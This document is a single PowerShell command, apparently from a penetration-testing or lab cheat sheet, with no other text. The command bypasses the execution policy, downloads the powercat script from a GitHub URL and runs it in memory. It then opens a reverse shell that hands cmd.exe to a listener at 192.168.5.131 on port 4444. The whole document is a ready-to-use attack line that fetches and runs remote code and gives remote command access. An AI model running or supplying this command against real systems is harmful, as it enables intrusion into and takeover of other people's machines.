powershell -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'));powercat -c 192.168.5.131 -p 4444 -e cmd"
